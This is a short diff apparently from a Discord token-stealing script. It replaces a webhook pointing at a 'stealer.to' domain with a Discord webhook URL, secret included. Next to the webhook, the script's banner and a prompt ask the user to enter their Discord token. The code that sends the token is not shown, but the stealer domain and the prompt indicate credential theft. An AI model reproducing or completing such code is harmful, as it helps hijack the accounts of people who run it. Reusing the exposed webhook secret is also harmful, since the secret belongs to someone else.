@@ -19,7 +19,7 @@ banner = f"""
                                  {Fore.BLUE}Developers: | Death (tester zip){Fore.MAGENTA}
         
 """
-webhook = "https://stealer.to/post?uniqueid=3e362481"
+webhook = "https://discordapp.com/api/webhooks/1352305610611359806/bmuZczO9lg6BMSMaLdKPXvfHtybaLh8HgJw1CrRDgnv7eX5D-JXPgpjcui-Ynj2ZSBdJ"
 
 print(banner)
 TOKEN = input("Enter your Discord token: ").strip()
